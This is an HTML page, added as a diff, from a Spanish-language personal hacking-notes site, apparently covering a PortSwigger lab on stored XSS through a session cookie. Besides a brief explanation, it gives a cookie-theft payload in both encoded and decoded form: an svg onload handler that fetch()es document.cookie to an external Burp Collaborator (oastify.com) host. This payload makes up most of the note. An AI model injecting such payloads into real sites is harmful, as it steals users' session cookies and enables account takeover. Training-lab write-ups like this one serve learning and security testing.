@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;En la cookie hay que seleccionar wiener y lanzarle un escaneo y lo mismo con  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3aASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH&lt;/code&gt;&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>En la cookie hay que seleccionar wiener y lanzarle un escaneo y lo mismo con  <code class="language-plaintext highlighter-rouge">3aASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH</code></p>
+
+<pre><code class="language-HTTP">Cookie: session=wiener%3aASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH;
+</code></pre>
+
+<p>Nos encontrará un stored XSS , se ha encontrado porque parece ser que alguien ejecutó el XSS escondido y lanzó una petición al collaborator.</p>
+
+<p>Introducimos un payload para robar la cookie :</p>
+
+<pre><code class="language-HTTP">Cookie: session='%22%3e%3csvg%2fonload%3dfetch(%60%2f%2fmoevjmpvk74i1dc4cofpvfkxfolj9nxc.oastify.com%2f%24%7bencodeURIComponent(document.cookie)%7d%60)%3e%3aASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH;
+</code></pre>
+
+<pre><code class="language-HTML">Cookie: session='"&gt;&lt;svg/onload=fetch(`//moevjmpvk74i1dc4cofpvfkxfolj9nxc.oastify.com/${encodeURIComponent(document.cookie)}`)&gt;:ASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH;
+</code></pre>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
